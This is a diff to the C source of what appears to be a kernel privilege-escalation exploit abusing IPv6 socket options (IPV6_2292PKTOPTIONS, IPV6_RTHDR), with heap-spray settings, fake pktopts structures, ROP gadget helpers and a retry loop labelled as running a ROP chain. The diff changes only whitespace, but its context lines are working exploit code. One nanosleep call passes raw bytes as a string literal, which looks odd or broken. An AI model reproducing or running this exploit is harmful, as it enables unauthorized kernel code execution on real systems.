@@ -23,7 +23,6 @@
 #define SPRAY_SIZE 32
 #define SPRAY_TOTAL 512
 
-
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
 #define free_pktopts(s) set_pktopts(s, NULL, 0)
@@ -172,7 +171,6 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
     return tclass & 0xffff;
 }
 
-
 // Invokes a string ROP to get the IDT base
 unsigned long long __builtin_gadget_addr(const char*);
 unsigned long long rop_call_funcptr(void(*)(void*), ...);
@@ -216,7 +214,6 @@ static void reset_ipv6_opts(int s) {
     struct in6_pktinfo z = {0};
     setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
 }
-
 
 // External inputs from gadgets and ROP buffers
 void (*enter_krop)(void);
@@ -329,6 +326,7 @@ for (int attempts = 0; attempts < 10; attempts++) {
     nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
     break; // Successful exploit run ROP Chain
     }
+	
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
